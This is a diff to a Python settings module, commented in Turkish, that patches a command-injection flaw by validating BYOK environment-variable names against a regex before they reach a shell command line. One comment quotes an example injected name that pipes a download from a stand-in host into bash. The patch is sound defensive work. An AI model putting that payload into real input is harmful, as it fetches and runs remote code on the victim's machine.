@@ -25,6 +25,14 @@ if TYPE_CHECKING:
 
 SETTINGS_JSON = os.path.join(CLAUDEOPS_DIR, "settings.json")
 
+# BYOK env-var İSİMLERİ (settings.json'ın byok[cli] alanındaki anahtarlar)
+# spawn.py'de `env {ADI}={shlex.quote(value)} ...` olarak shell komut satırına
+# gömülüyor — SADECE değer (`value`) quote'lanıyordu, İSİM hiç doğrulanmıyordu.
+# `{"FOO; curl evil | bash #": "1"}` gibi bir env_name göndermek komut
+# enjeksiyonu demekti (Antigravity SEC-02, en kritik bulgu). Gerçek env-var
+# isimleri zaten hep bu şekle uyar — kısıtlama hiçbir meşru kullanımı kırmaz.
+BYOK_ENV_NAME_RE = re.compile(r"^[A-Z_][A-Z0-9_]*$")
+
 DEFAULT_SETTINGS: Dict[str, Any] = {
     "theme": "system",       # "system" | "light" | "dark"
     "handover_effort": "",   # "" = otomatik (default_handover_effort'un high-tercih mantığı)
@@ -82,10 +90,9 @@ DEFAULT_SETTINGS: Dict[str, Any] = {
                               # save_settings() bu alan için ayrı bir iç-içe merge yapıyor (bkz.
                               # o fonksiyonun içindeki "byok" dalı). Boş (varsayılan) = provider
                               # kendi normal routing'ine/login'ine göre spawn olur, hiçbir şey
-                              # enjekte edilmez. copilot'un env_overrides()'ı bunu KOMUT SATIRINA
-                              # gömüyor (`ps aux`'a açık, çok-kullanıcılı makinede risk) — ucli
-                              # KASITLI OLARAK bunu kullanmıyor, bkz. providers/ucli_provider.py'nin
-                              # dosya+`sh -c` dolaylaması.
+                              # enjekte edilmez. copilot ve ucli bunu KOMUT SATIRINA
+                              # gömmez (`ps aux` çok-kullanıcılı makinede açık): 0600 dosya + `sh -c`
+                              # dolaylaması (copilot_provider._sync_byok_env_file, ucli_provider).
     "cli_managed": {},       # {cli: "1"} — 2026-09-25, cli_install.py: bu CLI'yi claudeops'un
                               # kendisi mi kurdu (npm --prefix ile kendi bin/'ine) yoksa kullanıcı
                               # zaten kendi başına mı kurmuştu. `provider_bin`'le AYNI alan-bazlı
@@ -307,10 +314,16 @@ def _save_settings_locked(patch: Dict[str, Any]) -> Dict[str, Any]:
                     continue
                 target = dict(merged_byok.get(cli_name) or {})
                 for env_name, env_val in envs.items():
-                    if env_val:
-                        target[str(env_name)] = str(env_val)
-                    else:
-                        target.pop(str(env_name), None)
+                    env_name = str(env_name)
+                    if not env_val:
+                        target.pop(env_name, None)
+                        continue
+                    # Geçersiz bir isim (yukarıdaki BYOK_ENV_NAME_RE yorumuna
+                    # bkz.) sessizce ATLANIR — save_settings'in geri kalanı gibi
+                    # (bilinmeyen anahtar/tip toleransı) hata fırlatmak yerine.
+                    if not BYOK_ENV_NAME_RE.match(env_name):
+                        continue
+                    target[env_name] = str(env_val)
                 if target:
                     merged_byok[str(cli_name)] = target
                 else:
